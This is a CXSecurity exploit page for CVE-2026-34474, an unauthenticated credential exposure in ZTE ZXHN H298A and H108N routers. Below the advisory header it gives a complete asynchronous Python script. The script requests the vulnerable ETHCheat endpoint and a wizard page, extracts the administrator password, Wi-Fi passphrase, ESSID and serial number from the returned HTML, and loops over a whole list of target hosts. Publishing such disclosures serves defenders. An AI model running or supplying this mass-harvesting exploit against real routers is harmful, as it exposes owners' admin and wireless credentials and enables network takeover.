---
title: ZTE H298A / H108N Unauthenticated Credential Exposure
url: https://cxsecurity.com/issue/WLB-2026060004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-06
fetch_date: 2026-06-07T06:15:47.216391
---

# ZTE H298A / H108N Unauthenticated Credential Exposure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ZTE H298A / H108N Unauthenticated Credential Exposure** **2026.06.06**  Credit:  **[Mina Nageh Salalma (Monx Research)](https://cxsecurity.com/author/Mina%2BNageh%2BSalalma%2B%28Monx%2BResearch%29/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-34474](https://cxsecurity.com/cveshow/CVE-2026-34474/ "Click to see CVE-2026-34474")**  CWE: **N/A** | |

# Exploit Title: ZTE H298A / H108N - Unauthenticated Credential Exposure
via ETHCheat Parameter
# Date: 2026-05-20
# Exploit Author: Mina Nageh Salalma (Monx Research)
# Vendor Homepage: https://www.zte.com.cn
# Software Link:
https://github.com/minanagehsalalma/cve-2026-34474-zte-h298a-h108n-sensitive-data-exposure
# Version: ZXHN H298A 1.1, ZXHN H108N 2.6
# Tested on: ZTE ZXHN H298A 1.1, ZTE ZXHN H108N 2.6
# CVE: CVE-2026-34474
# Description:
# An unauthenticated attacker can retrieve the live administrator password,
# WLAN PSK, and ESSID from a ZTE H298A or H108N router by issuing a single
# HTTP GET request to /getpage.lua?pid=1000&ETHCheat=1. The device returns
# HTML markup containing the fields OBJ\_USERINFO\_IDPassword1 (admin
password),
# WLANPSK\_KeyPassphrase1 (Wi-Fi PSK), and WLANAP\_ESSID1 in plaintext.
# A second related endpoint exposes the serial number.
# No authentication, session, or cookie is required.
#
# Affected Firmware:
# - ZXHN H298A 1.1
# - ZXHN H108N 2.6
#
# MITRE CVE: https://www.cve.org/CVERecord?id=CVE-2026-34474
# Full write-up:
https://github.com/minanagehsalalma/cve-2026-34474-zte-h298a-h108n-sensitive-data-exposure
import aiohttp
import asyncio
import html
import re
import os
from colorama import Fore, Style, init
init() # Initialize colorama
async def get\_essid\_password(session, url):
try:
async with aiohttp.ClientSession() as session:
# First request
async with session.get("http://" + url +
"/getpage.lua?pid=1000&ETHCheat=1", verify\_ssl=False) as response:
html\_text = await response.text()
Admin =
re.search(r"id\s\*=\s\*'OBJ\_USERINFO\_IDPassword1'\s\*value\s\*=\s\*'([^']+)'",
html\_text).group(1)
Admin = html.unescape(Admin)
ESSID =
re.search(r"id\s\*=\s\*'WLANAP\_ESSID1'\s\*value\s\*=\s\*'([^']+)'",
html\_text).group(1)
ESSID = html.unescape(ESSID)
password =
re.search(r"id\s\*=\s\*'WLANPSK\_KeyPassphrase1'\s\*value\s\*=\s\*'([^']+)'",
html\_text).group(1)
password = html.unescape(password)
async with session.get("http://" + url +
"/wizard\_page/wizard\_overETHfail\_set\_lua.lua") as response:
html\_text = await response.text()
serial\_num =
re.search(r"<ParaName>SerialNumber</ParaName><ParaValue>(.\*?)</ParaValue>",
html\_text).group(1)
serial\_num = html.unescape(serial\_num)
return {"URL": url, "Admin Password": Admin, "ESSID": ESSID,
"WIFI-Password": password, "Serial Number": serial\_num}
except Exception as e:
return {"URL": url, "Admin Password": "", "ESSID": "",
"WIFI-Password": "", "Serial Number": ""}
async def main():
with open("urls.txt", "r") as f:
urls = f.read().splitlines()
tasks = []
async with aiohttp.ClientSession() as session:
for url in urls:
tasks.append(get\_essid\_password(session, url))
results = await asyncio.gather(\*tasks)
for r in results:
print(f"[+] {r['URL']} | Admin: {r['Admin Password']} | ESSID:
{r['ESSID']} | WiFi: {r['WIFI-Password']} | Serial: {r['Serial Number']}")
if \_\_name\_\_ == "\_\_main\_\_":
asyncio.run(main())

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026060004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top